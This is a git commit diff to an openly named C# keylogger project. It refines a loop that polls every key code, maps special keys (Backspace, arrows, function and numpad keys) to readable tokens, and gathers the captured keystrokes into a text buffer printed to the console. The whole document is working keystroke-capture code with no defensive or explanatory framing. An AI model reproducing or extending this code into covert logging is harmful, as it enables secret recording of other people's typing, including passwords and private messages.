2b4c05ed1143f81c21e85380eddee2ac78a196cd
Darkempire78 <clement.wawszczyk@gmail.com>
2021-04-03 14:15:32 +0200

    udpate

--- Keylogger/Program.cs
+++ Keylogger/Program.cs
@@ -18,10 +18,11 @@ namespace Keylogger
         {
             bool isShift = false;
             bool isCapital = false;
+            string text = "";
 
             while (true)
             {
-                Thread.Sleep(120);
+                Thread.Sleep(100);
                 
                 for (int keyCode = 0; keyCode < 255; keyCode++)
                 {
@@ -45,13 +46,13 @@ namespace Keylogger
                             isCapital = !isCapital;
                         }
 
-
+                        // if letters pressed 
                         if (
                                 (!isShift && !isCapital) &&
                                 (keyCode >= 65 && keyCode <= 90)
                             ) 
                         {
-                           keyString = ((Keys)keyCode).ToString().ToLower();          
+                           keyString = ((Keys)keyCode).ToString().ToLower(); // Convert from ASCII to STRING        
                         } 
                         else
                         {
@@ -59,7 +60,27 @@ namespace Keylogger
                             if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
                             else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                             else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
-                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; } // Ignore the mouse buttons
+
+                            else if (((Keys)keyCode) == Keys.Back) { keyString = "<BACK>"; }
+                            else if (((Keys)keyCode) == Keys.Delete) { keyString = "<DELETE>"; }
+
+                            // Arrows
+                            else if (((Keys)keyCode) == Keys.Left) { keyString = "<LEFT>"; }
+                            else if (((Keys)keyCode) == Keys.Right) { keyString = "<RIGHT>"; }
+                            else if (((Keys)keyCode) == Keys.Up) { keyString = "<UP>"; }
+                            else if (((Keys)keyCode) == Keys.Down) { keyString = "<DOWN>"; }
+
+                            else if (keyCode >= 112 && keyCode <= 123)
+                            {
+                                keyString = "<" + ((Keys)keyCode).ToString() + ">";
+                            }
+                            else if (keyCode >= 96 && keyCode <= 105)
+                            {
+                                keyString = ((Keys)keyCode).ToString().Substring(6);
+                            }
+
+                            // Ignore the mouse buttons
+                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; } 
                             else
                             {
                                 keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
@@ -67,8 +88,8 @@ namespace Keylogger
                             
                         }
 
-
-                        Console.Write(keyString);
+                        text = text + keyString;
+                        Console.WriteLine(text);
 
                         if (
                             (isShift) &&
